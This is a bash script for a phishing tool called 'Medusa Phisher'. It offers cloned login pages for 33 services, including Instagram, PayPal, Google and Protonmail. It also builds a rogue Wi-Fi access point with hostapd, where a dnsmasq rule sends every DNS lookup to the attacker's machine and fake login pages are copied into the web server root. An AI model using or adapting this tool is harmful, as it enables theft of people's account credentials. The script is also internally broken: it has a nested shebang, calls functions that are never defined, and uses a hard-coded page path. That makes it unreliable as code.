#!/bin/bash

# Function to display menu
menu() {

#!/bin/bash

# ASCII art for "Medusa"
echo -e "\e[1;94m"
echo "                          __  __          _                   ____  _     _     _  "
echo "                         |  \/  | ___  __| |_   _ ___  __ _  |  _ \| |__ (_)___| |__   ___ _ __  "
echo "                         | |\/| |/ _ \/ _\`| | | / __|/ _\`| | |_) | '_ \| / __| '_ \ / _ \ '__| "
echo "                         | |  | |  __/ (_| | |_| \__ \ (_| | |  __/| | | | \__ \ | | |  __/ |  "  
echo "                         |_|  |_|\___|\__,_|\__,_|___/\__,_| |_|   |_| |_|_|___/_| |_|\___|_|  CODED BY: Adrilaw Github: https://github.com/Adrilaw"
echo -e "\e[1;33m"

# Print menu options
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m MEDUSA PHISHER  v1.0\e[0m\n"                                
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay   \e[0m                 \n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest   \e[0m             \n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;91m CryptoCurrency   \e[0m         \n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m Github\e[0m         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;91m Verizon   \e[0m                \n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Google\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;91m DropBox   \e[0m               \n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;91m Adobe ID   \e[0m               \n"
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;91m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;91m Shopify   \e[0m               \n"
printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;91m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;91m Messenger   \e[0m            \n"
printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;91m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;91m GitLab   \e[0m                 \n"
printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;91m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;91m Twitch   \e[0m                \n"
printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;91m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;91m MySpace   \e[0m               \n"
printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;91m Badoo   \e[0m                 \n"
printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m VK   \e[0m                     \n"
printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Yandex   \e[0m                 \n"
printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m            \n"

# Add the coded by line
printf "                                                \e[1;94m CODED BY: @Adrilaw  CREDIT TO FOR SITES TEMPLETE: https://github.com/8L4NK/blackeye/\e[0m\n"

read -p $'\n\e[1;92m➜ [\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option



if [[ $option == 1 ]]; then
server="instagram"
start

elif [[ $option == 2 ]]; then
server="facebook"
start
elif [[ $option == 3 ]]; then
server="snapchat"
start
elif [[ $option == 4 ]]; then
server="twitter"
start
elif [[ $option == 5 ]]; then
server="github"
start
elif [[ $option == 6 ]]; then
server="google"
start

elif [[ $option == 7 ]]; then
server="spotify"
start

elif [[ $option == 8 ]]; then
server="netflix"
start

elif [[ $option == 9 ]]; then
server="paypal"
start

elif [[ $option == 10 ]]; then
server="origin"
start

elif [[ $option == 11 ]]; then
server="steam"
start

elif [[ $option == 12 ]]; then
server="yahoo"
start

elif [[ $option == 13 ]]; then
server="linkedin"
start

elif [[ $option == 14 ]]; then
server="protonmail"
start

elif [[ $option == 15 ]]; then
server="wordpress"
start

elif [[ $option == 16 ]]; then
server="microsoft"
start

elif [[ $option == 17 ]]; then
server="instafollowers"
start

elif [[ $option == 18 ]]; then
server="shopping"
start

elif [[ $option == 19 ]]; then
server="pinterest"
start

elif [[ $option == 20 ]]; then
server="cryptocurrency"
start

elif [[ $option == 21 ]]; then
server="verizon"
start

elif [[ $option == 22 ]]; then
server="dropbox"
start

elif [[ $option == 23 ]]; then
server="adobe"
start

elif [[ $option == 24 ]]; then
server="shopify"
start

elif [[ $option == 25 ]]; then
server="messenger"
start

elif [[ $option == 26 ]]; then
server="gitlab"
start

elif [[ $option == 27 ]]; then
server="twitch"
start

elif [[ $option == 28 ]]; then
server="myspace"
start

elif [[ $option == 29 ]]; then
server="badoo"
start

elif [[ $option == 30 ]]; then
server="vk"
start

elif [[ $option == 31 ]]; then
server="yandex"
start

elif [[ $option == 32 ]]; then
server="devianart"
start

elif [[ $option == 33 ]]; then
server="create"
createpage
start

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}

# Function to start server option
start_server() {
    server=$1
    # Start the server
    echo "Start the server for: $server"
}

# Open dnsmasq configuration file with nano
nano /etc/dnsmasq.conf

# Add redirect all requests to IP 192.168.1.1
echo "address=/#/192.168.1.1" >> /etc/dnsmasq.conf

# Prompt user to enter SSID for hostapd
read -p "Enter SSID for the Wi-Fi network: " ssid

# Change SSID in hostapd.conf
sed -i "s/^ssid=.*/ssid=$ssid/" /etc/hostapd/hostapd.conf

# Start dnsmasq with custom configuration
dnsmasq -C /etc/dnsmasq.conf

# Start hostapd in background
hostapd -B /etc/hostapd/hostapd.conf

# Prompt user to enter network interface
read -p "Enter your network interface (e.g., wlan0): " interface

# Set up IP address for the network interface
ifconfig $interface 192.168.1.1/24

# Copy login page to appropriate location
cp sites/serveroption/login.html /var/www/html/
cp sites/serveroption/login.php /var/www/html/
cp sites/serveroption/index.php /var/www/html/

# Call the menu function to start server option
menu
